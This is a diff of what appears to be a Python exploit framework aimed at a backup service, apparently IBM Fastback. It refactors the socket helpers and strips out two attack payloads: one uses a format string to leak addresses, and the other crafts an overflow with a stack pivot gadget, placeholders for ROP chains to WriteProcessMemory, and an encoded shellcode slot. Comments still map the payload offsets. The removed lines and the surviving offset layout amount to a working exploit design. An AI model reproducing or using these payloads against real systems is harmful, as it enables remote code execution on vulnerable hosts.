@@ -1132,8 +1132,9 @@ class ROP:
 class Network:
     class TCP:
         # Create a regular TCP socket
-        def createsocktcp(host,port):
+        def createsocktcp(host,port, timeout=timeout):
             socktcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            socktcp.settimeout(timeout)
             socktcp.connect((host, port))
             return socktcp
 
@@ -1148,92 +1149,92 @@ class Network:
                 sock.settimeout(timeout)
                 sock.connect((host, port))
             return sock
-        
-        # Use or create a buffered global TCP socket
-        def sendrecvsocktcp(buffer, recvsize=1024, keepopen=True, recvallbuf=True, sendall=False, retchunksize=False):
-            """
-            Sends data through an open socket and optionally receives data, either in chunks or a single buffer.
 
-            Args:
-                buffer (bytes): The data to send.
-                recvsize (int): The maximum number of bytes to receive at once (default is 1024).
-                keepopen (bool): Whether to keep the socket open after communication (default is True).
-                recvallbuf (bool): Whether to receive the full buffer in chunks (default is True).
-                sendall (bool): Whether to use `sendall()` (default is False, meaning `send()` is used).
-                retchunksize (bool): Whether to return the size of the chunks received (default is False).
-
-            Returns:
-                bytes: The received data.
-                int (optional): The total number of bytes received, if `retchunksize` is True.
-                None: If socket is closed and `keepopen` is False.
-            
-            Raises:
-                Exception: In case of errors during the socket operation.
-            """
+        # Use or create global TCP socket; send and buffered receive
+        def sendrecvsocktcp(buffer, recvsize=1024, recvbuffered=False, sendall=False, keepopen=True):
             global sock
-
             try:
                 # Check if the socket is open, otherwise create a new one
                 if not (sock and sock.fileno() != -1):
                     print("[!] Socket not open, reopening...")
-                    Network.creategsocktcp(host, port)  # Reinitialize the socket if needed
-                
+                    Network.TCP.creategsocktcp(host, port)  # Reinitialize the socket if needed
                 # Send data
                 if sendall:
                     sock.sendall(buffer)
                 else:
                     sock.send(buffer)
-
-                # Receive data if required
-                if recvallbuf:
+                # Receive buffered data
+                if recvbuffered:
                     chunksize = 0
                     resp = b""
-
                     # Receive initial response size
-                    respsize = sock.recv(recvsize)
-                    print(f"Received initial size data: {respsize.hex()}")
+                    initresp = sock.recv(recvsize)
+                    print(f"Received initial size data: {initresp.hex()}")
                     try:
-                        rwsize = int(respsize.hex(), 16)
-                        print(f"[*] The read/write size returned: {rwsize:x} bytes")
+                        respsize = int(initresp.hex(), 16)
+                        print(f"[*] The read/write size returned: {respsize:x} bytes")
                     except ValueError:
                         print("[!] Error parsing the response size")
                         return None
-
                     # Continuously receive chunks until the full response is received
-                    while chunksize < rwsize:
-                        chunk = sock.recv(rwsize - chunksize)
+                    while chunksize < respsize:
+                        chunk = sock.recv(respsize - chunksize)
                         if not chunk:  # Handle case where no data is received (e.g., connection closed)
                             print("[!] Socket closed or no data received.")
                             break
                         chunksize += len(chunk)
                         resp += chunk
-
-                    # Return the response and size if requested
-                    if retchunksize:
-                        return (resp, chunksize) if keepopen else (resp, chunksize, sock.close())
-                    else:
-                        return resp if keepopen else (resp, sock.close())
-
-                # Receive a single chunk if recvallbuf is False
+                    # Return the response and close socket if required
+                    return resp if keepopen else (resp, sock.close())
+                # Receive unbuffered data
                 else:
                     resp = sock.recv(recvsize)
                     if not keepopen:
                         sock.close()
                     return resp
-
             except socket.timeout:
                 print("[!] Socket timeout.")
                 if not keepopen:
                     sock.close()
                 sys.exit(0)
-            
             except Exception as e:
                 print(f"[!] Error: {e}")
                 traceback.print_exc()
                 if sock:
                     sock.close()
                 sys.exit(0)
+            except KeyboardInterrupt:
+                print("[!] Operation interrupted by user.")
+                if sock:
+                    sock.close()
+                sys.exit(0)
 
+        # Use or create global TCP socket; send and buffered receive
+        def sendsocktcp(buffer, sendall=False, keepopen=True):
+            global sock
+            try:
+                # Check if the socket is open, otherwise create a new one
+                if not (sock and sock.fileno() != -1):
+                    print("[!] Socket not open, reopening...")
+                    Network.TCP.creategsocktcp(host, port)  # Reinitialize the socket if needed
+                # Send data
+                if sendall:
+                    sock.sendall(buffer)
+                else:
+                    sock.send(buffer)
+                if not keepopen:
+                    sock.close()
+            except socket.timeout:
+                print("[!] Socket timeout.")
+                if not keepopen:
+                    sock.close()
+                sys.exit(0)
+            except Exception as e:
+                print(f"[!] Error: {e}")
+                traceback.print_exc()
+                if sock:
+                    sock.close()
+                sys.exit(0)
             except KeyboardInterrupt:
                 print("[!] Operation interrupted by user.")
                 if sock:
@@ -1337,101 +1338,28 @@ class Payload:
 
         return buffer
         
-    def leakaddr(function):
-        # Opcode
-        opcodeleak = 0x2000
-        
+    def leakaddr():
         # Lengths
         maxlen = 0x15000
-        prebuffiller = 0x8
-        
-        # Offsets
-        offsetprebuf1 = 0xc
-        offsetprebuf2 = 0x34
-        
-        # Vars
-        opcodeval = pack("<i", opcodeleak)
-        memcpy1_src = pack("<i", 0x0)
-        memcpy1_size = pack("<i", 0x100)
-        memcpy2_src = pack("<i", 0x0)
-        memcpy2_size = pack("<i", 0x200)
-        memcpy3_src = pack("<i", 0x0)
-        memcpy3_size = pack("<i", 0x300)
-        
-        # Vars prints
-        buf1 = function + b"\x00"
-        buf2 = b"B" * 0x10
-        formatstr = b"SymbolOperation"
-        formatstr += b"%s %s %d" % (buf1,buf2,0x100)
         
         # Building buffer
         buffer = b""
-        buffer += b"A" * (offsetprebuf1 - len(buffer))
-        buffer += opcodeval
-        buffer += memcpy1_src
-        buffer += memcpy1_size
-        buffer += memcpy2_src
-        buffer += memcpy2_size
-        buffer += memcpy3_src
-        buffer += memcpy3_size
-        buffer += b"B" * prebuffiller
-        buffer += formatstr
-        buffer += b"D" * (offsetprebuf2 - len(buffer))
         buffer += b"F" * (maxlen - len(buffer))
 
         lenpacket = pack(">i", len(buffer) - 4)
 
         return lenpacket + buffer
 
-    def poccrash(intbaselib,ropskelwpm,ropchainwpm,ropchainscdecoder,ropchainskelalign,encodedsc):
-        # Opcode
-        opcode = 0x1295
+    def poccrash():
         
         # Lengths
         maxlen = 0x4000
         
-        # Offsets
-        offsetprebuf = 0xc
-        offsetstackpivot = 0x140
-        offsetropskel = offsetstackpivot - 0x54
-        offsetshellcode = 0x1004
-               
-        # Vars
-        opcodeval = pack("<i", opcode)
-        memcpy1_src = pack("<i", 0x0)
-        memcpy1_size = pack("<i", 0x3000)
-        memcpy2_src = pack("<i", 0x0)
-        memcpy2_size = pack("<i", 0x4000)
-        memcpy3_src = pack("<i", 0x0)
-        memcpy3_size = pack("<i", 0x5000)
-        
-        # Buf values
-        stackpivot = pack("<I", intbaselib + 0x5414a)           # add esp, 0x04 ; ret ;
-        
         # Building buffer
         buffer = b""
-        buffer += b"A" * (offsetprebuf - len(buffer))
-        buffer += opcodeval
-        buffer += memcpy1_src
-        buffer += memcpy1_size
-        buffer += memcpy2_src
-        buffer += memcpy2_size
-        buffer += memcpy3_src
-        buffer += memcpy3_size
-        buffer += b"B" * (offsetropskel - len(buffer))
-        buffer += ropskelwpm
-        buffer += b"C" * (offsetstackpivot - len(buffer))
-        buffer += stackpivot
-        buffer += ropchainwpm
-        buffer += ropchainscdecoder
-        buffer += ropchainskelalign
-        buffer += b"D" * (offsetshellcode - len(buffer))
-        buffer += encodedsc
         buffer += b"E" * (maxlen - len(buffer))
-        
-        lenpacket = pack(">i", len(buffer) - 4)
 
-        return lenpacket + buffer
+        return buffer
    
 class Program:
     def sendFunction(opcode):
@@ -1522,13 +1450,13 @@ def main(argv):
         ### LEAK ADDRESSES ###
         ######################
         print(Colors.BOLD + "\n[*] LEAKING ADDRESSES...\n" + Colors.END)
-        intwpmaddr = Program.leakmodAddr("Kernel32",b"WriteProcessMemory")
-        intbaselib = Program.leakmodAddr("Libmoduledll",b"FUNCTION",offsetlibfunction)
+        #intwpmaddr = Program.leakmodAddr("Kernel32",b"WriteProcessMemory")
+        #intbaselib = Program.leakmodAddr("Libmoduledll",b"FUNCTION",offsetlibfunction)
         
         ###########
         ### ROP ###
         ###########
-        # ASCII representation of ROP vars in payload
+        # Example ASCII representation of ROP vars in payload
         # ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
         #          [Filler and header]      [ROP skeleton]         [Filler]             [Stackpivot]           [ROP chain]       [ROP shellcode decoder]      [ROP align EAX decoder]        [Filler]         [Encoded shellcode]     [Filler]
         # OFFSET:       (0x0)        <-->      (0xEC)       <-->                  <-->    (0x140)     <-->       (0x144)     <-->        (0x1E0)         <-->                        <-->                  <-->   (0x1004)    <-->  (Until 0x4000)                                                                                
@@ -1545,7 +1473,7 @@ def main(argv):
         # Update ROP offset vars based on leaked addresses
         payloadoffsetsc = 0xeb8                                                         # Offset to first character of shellcode
         ropskeloffsetlpbuf = -(payloadoffsetsc + 0x50)                                  # Offset to first value in ROP skeleton to replace
-        ropdecoderoffseteax = -(payloadoffsetsc + 0x4b) # -0xf03                        # Offset to first char of shellcode, minus one; Fastback specific
+        ropdecoderoffseteax = -(payloadoffsetsc + 0x4b)                                 # Offset to first char of shellcode, minus one; Fastback specific
         ropskelalign = -(payloadoffsetsc + Shellcode.mappedbadscchars[-1] + 0x5f)       # Offset to ropskel function, calculated on last shellcode badbyte occurence
 
         # Update ROP chains
